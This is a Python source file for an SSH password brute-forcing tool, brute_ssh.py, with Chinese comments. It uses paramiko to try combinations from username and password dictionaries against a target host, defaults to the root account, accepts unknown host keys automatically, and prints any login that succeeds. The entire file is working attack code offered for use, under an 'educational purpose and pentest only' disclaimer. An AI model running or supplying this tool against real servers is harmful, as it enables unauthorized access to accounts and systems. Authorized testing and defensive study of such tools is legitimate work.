#coding:utf8

'''
一般来说ssh爆破，用户一般都是root，别的用户的情况很少见也很难猜解，所以考虑这样写

因为密码字典往往很大(多数情况)，所以在遍历密码字典的同时就开始爆破

支持，单用户名+单密码；单用户名+密码字典；用户字典+密码字典；

'''

docs = """
        [*] This was written for educational purpose and pentest only. Use it at your own risk.
        [*] Author will be not responsible for any damage!
        [*] Toolname			:	brute_ssh.py
        [*] Coder			:	sera
        [*] Version			:	0.1
        [*] ample of use	: python brute_ssh.py -t 192.168.1.100 -u root -pl password.txt
        """

from queue import Queue
import paramiko
import sys
import time

def logo():
    print("                |---------------------------------------------------------------|")
    print("                |                                                               |")
    print("                |                           77sera.cn                           |")
    print("                |                2018-8-19 brute_ssh.py v.0.1                   |")
    print("                |                        SSH Brute Forcing Tool                 |")
    print("                |                                                               |")
    print("                |---------------------------------------------------------------|\n")
    print(docs)

ssh = paramiko.SSHClient()

#允许连接不在~/.ssh/known_hosts文件中的主机
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def brute_ssh(hostname,port='22',username='root',password='',username_list='', password_list=''):
	#初始化list
	usernames = [] 
	passwords = []
	q = Queue() #用户字典和密码字典的笛卡尔积，是个队列
	
	 #根据参数判断是否需要载入字典，不需要则list只有一个值
	if username_list != '': 
		usernames = load_file(username_list)
	else:
		usernames.append(username)
	if password_list != '':
		passwords = load_file(password_list)
	else:
		passwords.append(password)
	
	#生成用户字典和密码字典的笛卡尔积
	for u in usernames:
		u = u.strip()
		for p in passwords:
			p = p.strip()
			q.put([u,p])
	
	count = 0 #计数
	
	print('[*] Cracking start...')
	
	while True:
		if q.empty():
			print('[!] No usernames or passwords left!')
			print('[!] END')
			break
		else:
			count+=1
			u,p = q.get()
			print('[-] trying '+str(count)+' data...\tu='+u+'\tp='+p)
			time.sleep(0.1)
			try:
				ssh.connect(hostname=hostname, port=port, username=u, password=p)
				print('[!] Cracking success!')
				print('[*] username=>'+u)
				print('[*] password=>'+p)
				break
			except:
				pass

#载入字典文件，返回一个一维list
def load_file(file_path):
	ok = 0
	try:
		data = open(file_path,'r').readlines()
		ok = 1
	except:
		data = []
	if not ok: #载入字典失败
		print('[!] Load file failed!')
		sys.exit(1)
	return data
				
def xhelp():
    print("[*]-t, --target            ip/hostname     <> Our target")
    print("[*]-u, --username      username    <> username string, default root")
    print("[*]-p, --password      password    <> passwordlist string")
    print("[*]-ul, --username_list      username list    <> username list")
    print("[*]-pl, --password_list      password list    <> passwordlist list")
    print("[*]-po, --port     port   <> target port ,default 22")
    print("[*]-h, --help              help            <> print this help")
    print("[*]Example : python brute_ssh.py -t 192.168.1.100 -u root -p password")
    sys.exit(1)
				
if __name__ == '__main__':
	logo()
	hostname = ''
	port = 22
	username = 'root'
	password = ''
	username_list = ''
	password_list = ''
	try:
		for argv in sys.argv:
			if argv.lower() == "-t" or argv.lower() == "--target":
				hostname = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-po" or argv.lower() == "--port":
				port = int(sys.argv[sys.argv.index(argv)+1])
			elif argv.lower() == "-u" or argv.lower() == "--username":
				username = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-p" or argv.lower() == "--password":
				password = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-ul" or argv.lower() == "--username_list":
				username_list = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-pl" or argv.lower() == "--password_list":
				password_list = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-h" or argv.lower() == "--help":
				xhelp()
	except SystemExit:
		print("[!] Cheak your parametars input")
		sys.exit(0)
	except Exception:
		xhelp()
	
	#开始爆破
	brute_ssh(hostname=hostname,port=port,username=username, password=password,password_list=password_list)
